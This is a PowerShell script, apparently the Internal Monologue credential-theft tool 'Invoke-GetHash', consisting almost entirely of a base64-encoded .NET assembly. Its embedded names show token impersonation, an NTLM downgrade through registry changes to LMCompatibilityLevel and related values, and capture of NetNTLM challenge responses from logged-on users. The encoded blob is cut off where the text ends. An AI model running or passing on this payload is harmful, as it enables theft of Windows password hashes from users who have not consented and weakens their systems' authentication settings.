﻿$InternalMonologue = $null

Function Invoke-GetHash {

if ($InternalMonologue -ne "TRUE") {
    $script:InternalMonologue = "TRUE"
    $PS = "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YWQAdGhyZWFkAEFkZABGcm9tRWxldmF0ZWQASXNFbGV2YXRlZABpc0VsZXZhdGVkAENvbnZlcnRTaWRUb1N0cmluZ1NpZABwdHJTaWQASXNOdWxsT3JXaGl0ZVNwYWNlAEV4dGVuZGVkTlRMTURvd25ncmFkZQBOdGxtRG93bmdyYWRlAGRvd25ncmFkZQBMb2NhbEZyZWUAcHN6UGFja2FnZQBtZXNzYWdlAENoYWxsZW5nZQBjaGFsbGVuZ2UASURpc3Bvc2FibGUAZ2V0X0hhbmRsZQBUaHJlYWRIYW5kbGUAUnVudGltZVR5cGVIYW5kbGUAQ2xvc2VIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUAVG9rZW5IYW5kbGUAQWNxdWlyZUNyZWRlbnRpYWxzSGFuZGxlAFByb2Nlc3NIYW5kbGUAYkluaGVyaXRIYW5kbGUASXNJblJvbGUAV2luZG93c0J1aWx0SW5Sb2xlAEFkZENvbnNvbGUASW50ZXJuYWxNb25vbG9ndWVDb25zb2xlAGdldF9OYW1lAFVzZXJOYW1lAGdldF9Qcm9jZXNzTmFtZQBwc3pUYXJnZXROYW1lAG5hbWUATG9jYWxNYWNoaW5lAFZhbHVlVHlwZQBkd1Rva2VuVHlwZQBCdWZmZXJUeXBlAGJ1ZmZlclR5cGUAU3lzdGVtLkNvcmUATlRMTVJlc3RvcmUAcmVzdG9yZQBQdHJUb1N0cnVjdHVyZQBmQ3JlZGVudGlhbFVzZQBSZWFkT25seUNvbGxlY3Rpb25CYXNlAFBhcnNlTlRSZXNwb25zZQBBZGRSZXNwb25zZQBJbnRlcm5hbE1vbm9sb2d1ZVJlc3BvbnNlAHJlc3BvbnNlAHZlcmJvc2UARGlzcG9zZQBJbXBlcnNvbmF0ZQBpbXBlcnNvbmF0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEV4dGVuc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAEludGVybmFsTW9ub2xvZ3VlAERlbGV0ZVZhbHVlAEdldFZhbHVlAFNldFZhbHVlAHZhbHVlAGJ1ZmZlclNpemUAU2l6ZU9mAE9wZW5Bc1NlbGYAQnl0ZUFycmF5VG9TdHJpbmcAaGV4U3RyaW5nAFN1YnN0cmluZwBnZXRfTGVuZ3RoAFRva2VuSW5mb3JtYXRpb25MZW5ndGgAUmV0dXJuTGVuZ3RoAEdldEhleFZhbABBbGxvY0hHbG9iYWwARnJlZUhHbG9iYWwATWFyc2hhbABwaENyZWRlbnRpYWwAU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbABXaW5kb3dzUHJpbmNpcGFsAHBzelByaW5jaXBhbABJbXBlcnNvbmF0aW9uTGV2ZWwAb2xkVmFsdWVfTE1Db21wYXRpYmlsaXR5TGV2ZWwASW50ZXJuYWxNb25vbG9ndWVEbGwAYWR2YXBpMzIuZGxsAGtlcm5lbDMyLmRsbABzZWN1cjMyLmRsbABJbnRlcm5hbE1vbm9sb2d1ZURsbC5kbGwAaE1lbQBTeXN0ZW0AVHJpbQBFbnVtAHBHZXRLZXlGbgBPcGVuVGhyZWFkVG9rZW4AaEV4aXN0aW5nVG9rZW4AT3BlblByb2Nlc3NUb2tlbgBwaE5ld1Rva2VuAHRva2VuAE1haW4ARG9tYWluAHVsVmVyc2lvbgBTZWN1cml0eUlkZW50aWZpY2F0aW9uAFNlY3VyaXR5RGVsZWdhdGlvbgBHZXRUb2tlbkluZm9ybWF0aW9uAFNlY3VyaXR5SW1wZXJzb25hdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBQcm9jZXNzVGhyZWFkQ29sbGVjdGlvbgBJbnZhbGlkT3BlcmF0aW9uRXhjZXB0aW9uAEdvAFplcm8AUHRyVG9TdHJpbmdBdXRvAFRhcmdldERhdGFSZXAAcHRzVGltZVN0YW1wAGZDb250ZXh0UmVxAFRvQ2hhcgBTdHJpbmdCdWlsZGVyAGNiQnVmZmVyAFNlY0J1ZmZlcgBwdkJ1ZmZlcgBTZWN1cml0eUlkZW50aWZpZXIAZ2V0X1VzZXIASW50ZXJuYWxNb25vbG9ndWVGb3JDdXJyZW50VXNlcgBCaXRDb252ZXJ0ZXIASUVudW1lcmF0b3IAR2V0RW51bWVyYXRvcgAuY3RvcgBscFNlY3VyaXR5RGVzY3JpcHRvcgBTdHJ1Y3R1cmVUb1B0cgBSZWFkSW50UHRyAHBmQ29udGV4dEF0dHIAU3lzdGVtLkRpYWdub3N0aWNzAGdldF9UaHJlYWRzAHRocmVhZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAQWRkUmVzcG9uc2VzAHJlc3BvbnNlcwBHZXRQcm9jZXNzZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAHNlY0J1ZmZlckJ5dGVzAENvbnRhaW5zAFN0cmluZ0V4dGVuc2lvbnMAU3lzdGVtLkNvbGxlY3Rpb25zAEdyb3VwcwBnZXRfQ2hhcnMAY0J1ZmZlcnMAcEJ1ZmZlcnMAYXV0aGVudGljYXRlZFVzZXJzAFRva2VuSW5mb3JtYXRpb25DbGFzcwBkd0Rlc2lyZWRBY2Nlc3MASGFuZGxlUHJvY2VzcwBwcm9jZXNzAFNlY3VyaXR5QW5vbnltb3VzAENvbmNhdABBcHBlbmRGb3JtYXQAaE9iamVjdAByZXN1bHQAcHZHZXRLZXlBcmd1bWVudABnZXRfQ3VycmVudABHZXRDdXJyZW50AEdyb3VwQ291bnQASGlnaFBhcnQATG93UGFydABDb252ZXJ0AHBJbnB1dABwT3V0cHV0AG91dHB1dABNb3ZlTmV4dABTeXN0ZW0uVGV4dABwaENvbnRleHQAV2luZG93c0ltcGVyc29uYXRpb25Db250ZXh0AHBoTmV3Q29udGV4dABJbml0aWFsaXplU2VjdXJpdHlDb250ZXh0AEFjY2VwdFNlY3VyaXR5Q29udGV4dABEdXBsaWNhdGVUb2tlbkV4AENvbnZlcnRIZXgAaGV4AFN0cmluZ1RvQnl0ZUFycmF5AEdldFNlY0J1ZmZlckJ5dGVBcnJheQBPcGVuU3ViS2V5AEdldFJlZ0tleQBTZXRSZWdLZXkAUmVnaXN0cnlLZXkAa2V5AENvcHkAcHRzRXhwaXJ5AFJlZ2lzdHJ5AG9wX0VxdWFsaXR5AG9wX0luZXF1YWxpdHkASW1w